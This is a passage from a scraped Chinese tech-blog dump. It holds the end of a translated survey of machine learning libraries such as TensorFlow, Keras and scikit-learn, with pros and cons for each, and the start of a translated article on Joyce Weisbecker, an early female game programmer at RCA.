库的世界吧。</p>\n<hr>\n<h3>TensorFlow</h3>\n<h5><strong>“使用数据流程图对可拓展的机器学习进行计算”</strong></h5>\n<h4><img class=\"aligncenter\" title=\"Tensorflow image recognition\" src=\"https://dashbouquet.com/assets/img/blog/tensorflow-example.png\" alt=\"How does a deep learning network work?\" width=\"800\" height=\"452\"></h4>\n<h4><strong>语言：C++</strong></h4>\n<h4><strong>84 725 ★</strong></h4>\n<p>初接触 AI 时，你听说的首批框架应该包含了谷歌的 TensorFlow。</p>\n<p>TensorFlow 是一个使用数据流程图进行数值计算的开源软件。这个不错的框架因其架构而闻名，它允许在任何 CPU 或 GPU 上进行计算，不管是桌面、服务器，还是移动设备。它可在 Python 编程语言中使用。</p>\n<p>TensorFlow 主要是通过数据层进行排序，而我们可以调用节点，并根据所得到的信息进行决策。<a href=\"https://www.tensorflow.org/\" target=\"_blank\">点击查看</a>！</p>\n<p><a href=\"http://playground.tensorflow.org/#activation=tanh&amp;batchSize=10&amp;dataset=circle&amp;regDataset=reg-plane&amp;learningRate=0.03&amp;regularizationRate=0&amp;noise=0&amp;networkShape=4,2&amp;seed=0.45748&amp;showTestData=false&amp;discretize=false&amp;percTrainData=50&amp;x=true&amp;y=true&amp;xTimesY=false&amp;xSquared=false&amp;ySquared=false&amp;cosX=false&amp;sinX=false&amp;cosY=false&amp;sinY=false&amp;collectStats=false&amp;problem=classification&amp;initZero=false&amp;hideText=false\" target=\"_blank\"><img class=\"aligncenter\" title=\"Tensorflow\" src=\"https://dashbouquet.com/assets/img/blog/tensorfrlow-concept.png\" alt=\"Deep learning concept of Tensorflow\" width=\"800\" height=\"453\"></a></p>\n<p>优点：</p>\n<ul>\n<li>使用简单易学的语言，如 Python。</li>\n<li>使用计算图进行抽象。</li>\n<li>可以使用 TensorBoard 获得可视化。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>运行速度慢，因为 Python 不是最快的语言。</li>\n<li>缺乏许多预训练的模型。</li>\n<li>不完全开源。</li>\n</ul>\n<h3>Microsoft CNTK</h3>\n<h5><strong>“开源的深度学习工具包”</strong></h5>\n<h4><img title=\"Microsoft CNTK\" src=\"https://dashbouquet.com/assets/img/blog/micrisift-cntk-banner.png\" alt=\"Microsoft Cognitive Toolkit\" width=\"1259\" height=\"472\"></h4>\n<h4><strong>语言：C++</strong></h4>\n<h4><strong>13 516 ★</strong></h4>\n<p>我们是否可以将它看作是微软对谷歌 TensorFlow 的回应？</p>\n<p>微软的 CNTK（计算网络工具包）是一个用来增强模块化和保持计算网络分离的库，提供学习算法和模型描述。</p>\n<p>在需要大量服务器进行计算的情况下，CNTK 可以同时利用多台服务器。</p>\n<p>据说 CNTK 在功能上接近谷歌的 TensorFlow，但速度比对方要快一些。<a href=\"https://github.com/Microsoft/CNTK\" target=\"_blank\">了解更多</a>。</p>\n<p><a href=\"https://docs.microsoft.com/en-us/cognitive-toolkit/\" target=\"_blank\"><img title=\"CNTK architecture\" src=\"https://dashbouquet.com/assets/img/blog/microsoft-cntk-architecture.png\" alt=\"Microsoft CNTK architecture\" width=\"1400\" height=\"721\"></a></p>\n<p>优点：</p>\n<ul>\n<li>高度灵活。</li>\n<li>允许分布式训练。</li>\n<li>支持 C++、C#、Java 和 Python。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>它由一种新的语言——NDL（网络描述语言）实现。</li>\n<li>缺乏可视化。</li>\n</ul>\n<h3>Theano</h3>\n<h5><strong>“数值计算库”</strong></h5>\n<h5><strong><img title=\"Theaono\" src=\"https://dashbouquet.com/assets/img/blog/theano.png\" alt=\"Theano framework\" width=\"558\" height=\"164\"></strong></h5>\n<h4><strong>语言：Python</strong></h4>\n<h4><strong>7 550 ★</strong></h4>\n<p>作为 TensorFlow 的强有力竞争对手，Theano 是一个强大的 Python 库，它允许使用高效多维数组进行数值计算。</p>\n<p>它不使用 CPU，而是透明地使用 GPU，用于数据密集型计算，所以效率很高。</p>\n<p>因此，在大约 10 年内，Theano 一直被用于大规模的数据密集型计算。</p>\n<p>然而，在 2017 年 9 月 28 日当日，开发团队宣称，将在 2017 年 11 月 15 日发布 1.0 版后，停止对它的主要开发。</p>\n<p>但这并没有削弱它的强大实力，你仍可以使用它，随时进行深入学习的研究。<a href=\"https://github.com/Theano/Theano\" target=\"_blank\">了解更多</a>。</p>\n<p><a href=\"http://www.wildml.com/2015/09/speeding-up-your-neural-network-with-theano-and-the-gpu/\" target=\"_blank\"><img title=\"Multilayer perceptron with one hidden layer and a softmax output layer.\" src=\"https://dashbouquet.com/assets/img/blog/theano-data-visualization.png\" alt=\"d3viz: Interactive visualization of Theano compute graphs\" width=\"1019\" height=\"645\"></a></p>\n<p>优点：</p>\n<ul>\n<li>对 CPU 和 GPU 进行了适当优化。</li>\n<li>高效的数值计算任务。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>与其他库相比，原始的 Theano 有点儿低级。</li>\n<li>需要与其他库一起使用，以获得较高级的抽象。</li>\n<li>在 AWS 上使用有点小 Bug。</li>\n</ul>\n<h3>Caffe</h3>\n<h5><strong>“应对深入学习的快速开放架构”</strong></h5>\n<h5><strong><strong><img class=\"aligncenter\" title=\"Caffe\" src=\"https://dashbouquet.com/assets/img/blog/caffe-banner.png\" alt=\"Caffe machine learning framework\" width=\"600\" height=\"325\"></strong></strong></h5>\n<h4><strong>语言：C++</strong></h4>\n<h4><strong>22 111 ★</strong></h4>\n<p>Caffe 是一个强大的深度学习框架。</p>\n<p>和这个列表中的其他框架一样，它对于深入学习的研究而言，是非常快速和有效的。</p>\n<p>使用 Caffe，你可以轻易地构建一个用于图像分类的 CNN（卷积神经网络）。它在 GPU 上运行良好，使得运行速度非常快。查看<a href=\"http://caffe.berkeleyvision.org/\" target=\"_blank\">主页</a>。<br>\n<a href=\"https://leonardoaraujosantos.gitbooks.io/artificial-inteligence/content/deep_learning_libraries.html\" target=\"_blank\"><img class=\"aligncenter\" title=\"Caffe overview\" src=\"https://dashbouquet.com/assets/img/blog/CaffeOverview.png\" alt=\"Caffe main classes\" width=\"430\" height=\"493\"></a></p>\n<p>上图是 Caffe 的主类。</p>\n<p>优点：</p>\n<ul>\n<li>可以与 Python 和 MATLAB 绑定使用。</li>\n<li>高性能。</li>\n<li>无需编写代码，即可训练模型。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>对递归网络支持不好。</li>\n<li>对新架构来说不是很好。</li>\n</ul>\n<h3>Keras</h3>\n<h5><strong>“针对人类的深度学习”</strong></h5>\n<h5><strong><strong><img title=\"Keras\" src=\"https://dashbouquet.com/assets/img/blog/keras.png\" alt=\"Keras frameowork\" width=\"666\" height=\"347\"></strong></strong></h5>\n<h4><strong>语言：Python</strong></h4>\n<h4><strong>23 711 ★</strong></h4>\n<p>Keras 是一个用 Python 编写的开源神经网络库。</p>\n<p>不似 TensorFlow、CNTK、Theano、Keras 这种端到端（End-to-End）的机器学习框架，</p>\n<p>相反，它是一个接口，提供了高层次的抽象，使得神经网络的配置变得更加简单，而不必考虑所在的框架。</p>\n<p>谷歌的 TensorFlow 目前支持 Keras 作为后端，而微软的 CNTK 也将在短时间内获得支持。<a href=\"https://keras.io/\" target=\"_blank\">了解更多</a>。</p>\n<p><img class=\"fancyimg\" title=\"Keras cheat sheet\" src=\"https://dashbouquet.com/assets/img/blog/Keras_Cheat_Sheet_Python-1.jpg\" alt=\"Keras Cheat Sheet: Neural Networks in Python\" width=\"2339\" height=\"1654\"></p>\n<p>优点：</p>\n<ul>\n<li>它对用户友好，易于上手。</li>\n<li>高度拓展。</li>\n<li>可以在 CPU 或 GPU 上无缝运行。</li>\n<li>完美兼容 Theano 和 TensorFlow。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>不能有效地作为一个独立的框架来使用。</li>\n</ul>\n<h3>Torch</h3>\n<h5 class=\"public \"><strong>“开源机器学习库”</strong></h5>\n<h5 class=\"public \"><strong><img class=\"aligncenter\" title=\"Torch\" src=\"https://dashbouquet.com/assets/img/blog/torch-tw.png\" alt=\"Torch framework\" width=\"630\" height=\"356\"></strong></h5>\n<h4><strong>语言：C</strong></h4>\n<h4><strong>7 584 ★</strong></h4>\n<p>Torch 是一个用于科学计算和数值计算的开源机器学习库。</p>\n<p>它是一个基于  Lua 编程语言（终于不再是 Python）的库。</p>\n<p>通过提供大量算法，使得深入学习的研究更加容易，并提高了效率和速度。它有一个强大的 N 维数组，帮助进行类似切片和索引这样的计算，并提供线性代数程序和神经网络模型。<a href=\"http://torch.ch/\" target=\"_blank\">了解更多</a>。</p>\n<p><a href=\"https://github.com/soumith/cvpr2015/blob/master/cvpr-torch.pdf\" target=\"_blank\"><img title=\"Torch example\" src=\"https://dashbouquet.com/assets/img/blog/cvpr-torch-example.png\" alt=\"Torch - convolutional network, for natural images\" width=\"2845\" height=\"2134\"></a></p>\n<p>优点：</p>\n<ul>\n<li>高度灵活。</li>\n<li>速度快，效率高。</li>\n<li>大量的预训练模型可用。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>说明文档不够清晰。</li>\n<li>缺乏立即使用的即插即用代码。</li>\n<li>它基于一个不怎么流行的编程语言 Lua。</li>\n</ul>\n<h3>Accord.NET</h3>\n<h5><strong>“针对 .NET 的机器学习、计算机视觉、统计学和通用科学计算”</strong></h5>\n<h5><strong><strong><img class=\"aligncenter\" title=\"Accord.net\" src=\"https://dashbouquet.com/assets/img/blog/accord-net.jpg\" alt=\"Accord.net machine learning framework\" width=\"746\" height=\"563\"></strong></strong></h5>\n<h4><strong>语言：C＃</strong></h4>\n<h4><strong>2 424 ★</strong></h4>\n<p>这是为 C# 程序员准备的。</p>\n<p>Accord.NET 框架是一个 .NET 机器学习框架，使得音频和图像的处理变得更加简单。</p>\n<p>该框架可以有效地解决数值优化、人工神经网络，甚至给出了可视化的特征。此外，Accord.NET 对计算机视觉和信号处理具有强大的功能，并且易于算法实现。查看<a href=\"http://accord-framework.net/\" target=\"_blank\">主页</a>。</p>\n<p><a href=\"http://accord-framework.net/samples.html\" target=\"_blank\"><img title=\"Accord.net samples\" src=\"https://dashbouquet.com/assets/img/blog/accrod-net-samples.jpg\" alt=\"Machine learning samples\" width=\"1040\" height=\"548\"></a></p>\n<p>优点：</p>\n<ul>\n<li>它拥有一个庞大且活跃的开发团队。</li>\n<li>说明文档非常不错。</li>\n<li>高质量的可视化。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>这不是一个非常流行的框架。</li>\n<li>与 TensorFlow 相比，速度慢。</li>\n</ul>\n<h3>Spark MLlib</h3>\n<h5><strong>“可扩展的机器学习库”</strong></h5>\n<h5><strong><strong><img class=\"aligncenter\" title=\"Spark MLlib\" src=\"https://dashbouquet.com/assets/img/blog/spark-runs-everywhere.png\" alt=\"Spark MLlib runs everywhere\" width=\"545\" height=\"425\"></strong></strong></h5>\n<h4><strong>语言：Scala</strong></h4>\n<h4><strong>15 708 ★</strong></h4>\n<p>Apache 的 Spark MLlib 是一个具有高度拓展性的机器学习库。</p>\n<p>它在 Java、Scala、Python 甚至 R 语言中都非常有用，因为它使用 Python 和 R 中类似 Numpy 这样的库，能够进行高效的交互。</p>\n<p>MLlib 可以很容易地插入 Hadoop 工作流程中。它提供了机器学习算法，如分类、回归、聚类等。</p>\n<p>这个强大的库在处理大规模的数据时，速度非常快。在<a href=\"https://spark.apache.org/mllib/\" target=\"_blank\">网站</a>上了解更多。</p>\n<p><a href=\"https://spark.apache.org/docs/2.1.1/ml-pipeline.html#code-examples\" target=\"_blank\"><img title=\"MLlib pipeline\" src=\"https://dashbouquet.com/assets/img/blog/ml-Pipeline.png\" alt=\"MLlib pipeline example\" width=\"1379\" height=\"352\"></a></p>\n<p>优点：</p>\n<ul>\n<li>对于大规模数据处理来说，非常快。</li>\n<li>可用于多种语言。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>陡峭的学习曲线。</li>\n<li>仅 Hadoop 支持即插即用。</li>\n</ul>\n<h3>Sci-Kit Learn</h3>\n<h5><strong>“Python 中的机器学习”</strong></h5>\n<h4><img class=\"fancyimg\" title=\"Sci-Kit Learn algorithm\" src=\"https://dashbouquet.com/assets/img/blog/sci-kit-learn-estimator.png\" alt=\"Choosing the right estimator\" width=\"1388\" height=\"865\"></h4>\n<h4><strong>语言：Python</strong></h4>\n<h4><strong>24 369 ★</strong></h4>\n<p>Sci-kit learn 是一个针对机器学习的强大 Python 库，主要用于构建模型。</p>\n<p>使用诸如 Numpy、SciPy 和 Matplotlib 等其他库构建，对于统计建模技术（如分类、回归、集群等）非常有效。</p>\n<p>Sci-Kit learn的特性包括监督式学习算法、非监督式学习算法和交叉验证。<a href=\"http://scikit-learn.org/\" target=\"_blank\">点击查看</a>。</p>\n<p><a href=\"http://scikit-learn.org/stable/auto_examples/neural_networks/plot_mlp_alpha.html\" target=\"_blank\"><img title=\"‘alpha’ on synthetic datasets\" src=\"https://dashbouquet.com/assets/img/blog/scikit-alpha-map.png\" alt=\"Varying regularization in Multi-layer Perceptron\" width=\"1700\" height=\"900\"></a></p>\n<p>优点：</p>\n<ul>\n<li>可以使用许多 shell 算法。</li>\n<li>高效的数据挖掘。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>不是最好的模型构建库。</li>\n<li>GPU 使用不高效。</li>\n</ul>\n<h3>MLPack</h3>\n<h5><strong>“可扩展的 C++ 机器学习库”</strong></h5>\n<h5><strong><strong><img title=\"MLPack\" src=\"https://dashbouquet.com/assets/img/blog/mlpack-main.png\" alt=\"MLPack framework\" width=\"700\" height=\"147\"></strong></strong></h5>\n<h4><strong>语言：C++</strong></h4>\n<h4><strong>1 856 ★</strong></h4>\n<p>MLPack 是一个使用 C++ 实现的可扩展的机器学习库。在 C++ 中，你可以猜到，它的内存管理非常出色。</p>\n<p>拥有高质量的机器学习算法与库，MLPack 的运行速度非常快。它对新手十分友好，因为它提供了一个可供使用的简单 API。<a href=\"http://mlpack.org/\" target=\"_blank\">点击查看</a>。</p>\n<p><a href=\"http://mlpack.org/docs/mlpack-git/doxygen/classmlpack_1_1hmm_1_1HMM.html#details\" target=\"_blank\"><img class=\"aligncenter\" style=\"border: 0px; vertical-align: middle; text-decoration: none !important; width: 660px; height: auto; margin-bottom: 20px; margin-top: 10px;\" title=\" MLPack master\" src=\"https://dashbouquet.com/assets/img/blog/classmlpack-inherit-graph.png\" alt=\"Inheritance diagram for HMM &lt;Distribution&gt;\" width=\"723\" height=\"235\"></a></p>\n<p>优点：</p>\n<ul>\n<li>高度拓展。</li>\n<li>可以与 Python 和 C++ 绑定。</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>说明文档不够清晰。</li>\n</ul>\n<hr>\n<h1>总结</h1>\n<p>本文所讨论的库都非常高效，并经过了时间的考验，质量上乘。五大巨头 Facebook、谷歌、雅虎、苹果、微软都在使用这些库进行深度学习和机器学习项目。</p>\n<p>你有什么理由不用哪？</p>\n<p>你能想到其他经常使用，但不在列表上的库吗？请在评论部分与我们分享。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113499\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113499votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113499\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            I'm OUT, never IN.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 48</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d1425f03e7e9722a55806f54fdc1d3bc1a00a373.jpg"}
{"url_object_id": "d319eedfb1e9cbc1005652a308ca61e9", "title": "最早做游戏设计与开发的女程序员", "url": "http://blog.jobbole.com/113401/", "create_date": "2017/12/30", "front_img_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz312xf4mj207r09madg.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "其他", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/chenyahui\">精算狗</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.fastcodesign.com/90147592/rediscovering-historys-lost-first-female-video-game-designer\">BENJ EDWARDS</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>第一批电子游戏程序员之一是一位年轻女性，那时她刚从高中毕业。</p>\n<p>四十年前，消费电子产品巨头 RAC 发布了 Studio II。这是一款可编程的电子游戏控制台，与 <a href=\"https://www.fastcompany.com/3040889/the-untold-story-of-the-invention-of-the-game-cartridge\">Fairchild Channel F</a> 一起，率先使用只读存储器盒（ROM cartridge）作为可交换的游戏媒体。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz312xf4mj207r09madg.jpg\" width=\"279\" height=\"346\"></p>\n<p>RCA 的控制台永远没能比得上 Atari 的 VCS，Magnavox 的 Odyssey，或者 Mattel 的 Intellivision。而且现在几乎没人记得它。但是它背后的真实故事是迷人的。它的基础技术始于 1969 年，当时一位有远见的人——Joseph Weisbecker——在家中开发出个人电脑。他的女儿 Joyce 最终成为了已知最早的女性开发者，她编写电子游戏并为此拿报酬。</p>\n<p>Joyce Weisbecker 的工作成果太不出名了，以至于在 2011 年，我宣称 <a href=\"http://www.vintagecomputing.com/index.php/archives/800/vcg-interview-carol-shaw-female-video-game-pioneer-2\">Carol Shaw</a> 为“第一位女性专业电子游戏设计师”。<a href=\"http://www.vintagecomputing.com/index.php/archives/800/vcg-interview-carol-shaw-female-video-game-pioneer-2\">Carol Shaw</a> 从 1978 年开始在 Atari 工作，并在之后设计了 Activision 的经典游戏 <i>River Raid</i>。而 Joyce Weisbecker 的成果是由一位科技历史学家提醒我的。尽管 Shaw 的工作成果依然在历史上很重要，但是实际上，Joyce Weisbecker 的成果要比她的早大约两年。</p>\n<p>而且 Joyce 是在没有成为 RCA 工作人员的情况下完成的。她现在说：“我知道当时 RCA 没有其他女性做开发工作。开发工作是由一些男性来做的，而且他们都是员工。我想我是唯一一个收钱开发电子游戏的公司外的人。所以我是第一个合同工，可能也是第一个独立的电子游戏开发者，因为我想到了这个主意又推销了它，然后他们说行。”</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fmz313s7zpj20g3092qaf.jpg\" width=\"579\" height=\"326\"></p>\n<h2>流在她血液里的工程学</h2>\n<p>Joyce Weisbecker 于 1958 年出生于新泽西州。她记得在童年时期，看着她的爸爸——一个固执的爱好者——利用白天不在 RCA 工作的时间，开发逻辑游戏，为当地魔术师设计舞台幻象并在地下室建造电子发明。她的妈妈 Jean Ann 是一位三年级教师。Jean 强调教育的价值，并鼓励大女儿追寻她天生的追求。</p>\n<p>无论什么时候，Joyce 一有机会就跟着去父亲在 RCA 的办公室，看看开发是什么。在那里，工程师们亲切地看着这个女孩，她似乎自然地吸收了展示给她的所有东西，包括一个由 RCA 爱玩的工程师在 20 世纪 60 年代中期开发的台球电子游戏原型。</p>\n<p>除了 Joseph 在 RCA 的工程工作外，他还被电脑的未来深深吸引着。在他读了 Edmund Berkeley 1949年的一本开创性的书——<i>Giant Brains </i>或者叫<i> Machines that Think ——</i>之后，他就迷上了这个领域。Joyce 讲述了她的父母在 1955 年秋天第一次相遇的故事，她的父亲告诉她母亲，某一天电脑会急剧微型化，并被装进几乎所有东西里——冰箱、打字机和烤箱。</p>\n<p>当 Joseph 最初迷上电脑时，电脑基本上就是真空管供电的庞然大物，需要用一个小城市的电力来操作。所以年长的 Weisbecker 用任何人能在纸上演算的计算技巧进行了大量实验。在 20 世纪 60 年代，他甚至写了一本平装书来跟你玩井字棋游戏（Tic-Tac-Toe），依据你选的哪一页书（也就是走哪一步）。</p>\n<p>随着科技的进步，Joseph 开始在家用电脑进行实验。一个叫作 Heathkit 的公司销售各种各样的电子产品和器具，任何人都可以订购未组装的产品，自己组装。Joyce 说：“他想买一个 Heathkit 的产品来建一个电脑。但是既然没有现成的，他决定把设计一个电脑的 Heathkit 作为一生的目标，这样任何人都能买来造一台电脑。”</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz314gnjej20fz093n40.jpg\" width=\"575\" height=\"327\"></p>\n<p>那时，典型的迷你电脑的价格在 $6,000 到 $25,000 之间。（为正确看待它，1972 年的美国户均年收入为 $11,286。）Joseph 晚上在地下室工作几个小时，自己用分离的元件和电路设计了一个完整的电脑系统，包括一个定制的中央处理器。</p>\n<p>Joyce 记得 1969 年陪父亲去 Radio Shack 商店购买他电脑原型的元件。他得去四个不同的商店买足够的开关和元件来制作电脑的前面板。前面板包含八个开关，每个开关都针对一个指令位。一路上他都对他的计划闭口不谈，这样就不会引起店主的怀疑，否则这些店主必然就会用关于家庭电脑的问题耽误他的时间。家庭电脑在那时是神奇疯狂的想法。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz3151cq5j20ft09342a.jpg\" width=\"569\" height=\"327\"></p>\n<p>在 Joseph 快完成第一个家庭个人电脑原型时，他决定把他的电脑称为 FRED，或者灵活的娱乐教育设备（Flexible Recreational Educational Device）。他自己掏腰包做了一个笑脸标志，并在 1970年、1971 年及 1972 年持续工作。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz316ch12j20gl0bpgzb.jpg\" width=\"597\" height=\"421\"></p>\n<h2>从 FRED 到 STUDIO II</h2>\n<p>Joyce 家 1300 平方英尺的房子在切里希尔（Cherry Hill）。Joyce 的父亲在地下室完成 FRED 之后，把他的机器放在餐厅旁的封闭后阳台。很快 Joyce 和她的小妹妹 Jean 就在父亲的鼓励下玩起了 FRED。Joyce 甚至开始了编程。</p>\n<p>她回忆说：“这是自然而然的兴趣。爸爸向我和妹妹演示了怎么做。我妹妹更喜欢上马术课。但是我想：’这就像很酷的谜题。这就是谜题的本质——它要么抓住你的兴趣，要么不。’”它一定抓住了 Joyce 的兴趣，Joyce 是她高中为数不多学习使用学校的可编程 100 步计算器的人之一。</p>\n<p>Joseph Weisbecker 在 RCA 的经理注意到了 FRED，但是他们最初持怀疑态度。在 20 世纪 70 年代早期，RCA 有号召力的长期领导 David Sarnoff 退休，RCA 随之退出了其黄金时代。他的辞职使得公司群龙无首，尽管他的儿子带领 RCA 走向无数方向，包括收购地毯公司和养鸡场。另外，RCA 由于最近向大型电脑市场进军的尝试失败而受损，导致数百万美元的贬值。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz3174s1ej20g8091n52.jpg\" width=\"584\" height=\"325\"></p>\n<p>大约 1973 年，RCA 将其注意力转回电脑上，Joseph 的自制 8 位电脑体系结构成为了官方用芯片建完整电脑项目的一部分。结果有了 Cosmac 1801 系列，它是 1975 年首次商用的两芯片微处理器系统。（后来改进为单芯片，Cosmac 1802，发布于 1976 年。）RCA 管理层把项目转向工业应用的内置电脑控制方向，但是老 Weisbecker 从没放弃为大众创造教育电脑的梦想。</p>\n<p>大约在 Atari 的 <i>Pong </i>火起来的时候，Joseph 试着向 RCA 推销可编程家庭电子游戏控制台的想法，但是管理层最初对这个想法没有兴趣。大约 1975 年，FRED 技术进入了拥有可交换软件的硬币操控的街机电子游戏柜。该项目很快成为泡影。但是最终，Joseph 的努力促成了一些家庭电脑产品，包括 DIY 个人电脑 Cosmac VIP 和游戏控制台 Studio II。</p>\n<p>Joyce Weisbecker 说：“他们拖了一年来决定他们向进入家庭市场。然后他们又花了一年多一点时间才真正做出来。而且还绕过了 FCC 认证。”</p>\n<p>根据 Joyce 所说，尽管 Studio II 直到 1977 年一月才公布——那是 Fairchild Channel F 进入市场几个月后——所用的技术，包括盒里的游戏，在 1975 年就准备好了。她说：“我觉得我对这件事有点愤愤不平，他本可以成为第一个。”</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz317saz6j20g5093tgo.jpg\" width=\"581\" height=\"327\"></p>\n<h2>工作中的 WEISBECKERS</h2>\n<p>基于 Joyce 父亲工作成果的家庭电子产品出现了。这为刚刚高中毕业的 Joyce 提供了一个机会。在 1976 年夏天，也是在瑞德大学第一个学期开始前的假期，Joseph 问她是否想为 RCA 编写电子游戏。</p>\n<p>她已经对她父亲的机器有了丰富的经验，便一头扎进了为 RCA Cosmac VIP 编写演示游戏的工作中。RCA Cosmac VIP 是廉价的商业电脑组件。它是基于 Joseph 的 FRED 来设计的，既作为原始家庭个人电脑，也作为 Cosmac 1802 CPU 应用的开发组件。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz318e5d8j20ev07mmz1.jpg\" width=\"535\" height=\"274\"></p>\n<p><i></i><i>Snake Race</i> 和 <i>Jackpot </i>是 Joyce 在 RCA 的编程首秀，尽管她没有为此收取报酬。她的父亲用来执行 VIP 项目的预算并不充足。RCA 把她写的软件包括在 VIP 使用手册的登记项目中，由机器所有者手动键入。</p>\n<p>但是很快 Joyce 就从 RCA 拿到了她的第一笔收入。随着  Studio II 家庭游戏控制台的工作准备好了，公司开始寻找软件。RCA 的雇员 Andy Modla 完成了 Studio II 10 盒的大部分发布，但是老 Weisbecker 把这看成她女儿获得更多编程经验的好机会。</p>\n<p>至于她女儿的控制台首秀的主角，Joseph 转向了他最喜欢的关注点：教育。把 Studio II 既看作廉价家庭电脑，又看作游戏控制台。他建议 RCA 利用它与子公司 Random House 教科书事业的联系。（该出版社是 RCA 疯狂混乱的经营多样化时期收购的不相关的公司。）</p>\n<p>八月份的某一天，Joseph 回家说：“他们在找人做关于 Studio II 的测验。你想做吗？”</p>\n<p>Joyce 回复道：“听起来挺无聊的。”</p>\n<p>他说：“写到你的简历上，你还能得到报酬呢。”</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fmz3191lt5j20g80bj11q.jpg\" width=\"584\" height=\"415\"></p>\n<p>根据 Joyce 保存的发票来看，这开始于一个叫做 <i>TV Schoolhouse I </i>的项目。Joyce 于 1976 年八月初编写完 TV Schoolhouse I，于八月九号提供给 RCA 并拿到了 250 美元的收入。编写这个简单游戏花了她大约一周时间。她在父亲的 FRED 原型机上工作，用纸笔写下集合代码，用十六进制的键盘输进电脑，一次一条命令。与她早期为 RCA 做的的编程工作不同，她的早期工作为她在 Cosmac VIP 使用手册上赢得了称赞，而这次她是匿名工作的。</p>\n<p><i></i><i>TV Schoolhouse I </i>是双玩家电脑测验，依赖于打印的来自盒的问题集。每个玩家轮流读小册子里的问题，然后用 Studio II 的键盘输入一个单选答案。程序会检查正确答案并在屏幕上计分。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fmz319r583j20gg0cf7e0.jpg\" width=\"592\" height=\"447\"></p>\n<p>1976 年十月，Joyce 编写了两个动作游戏：<i>Speedway</i> 和 <i>Tag</i>。在 <i>Speedway</i> 里，玩家驾驶一辆小车行驶在头顶上的赛道，与第二个人类玩家比赛。只有一个问题：Studio II 极低的 64 图形分辨率的 32 像素没给细节留下多大空间。</p>\n<p>Joyce 说：“和现代电脑打交道的人不能理解这样的限制。困难的部分不是把代码放进 2K 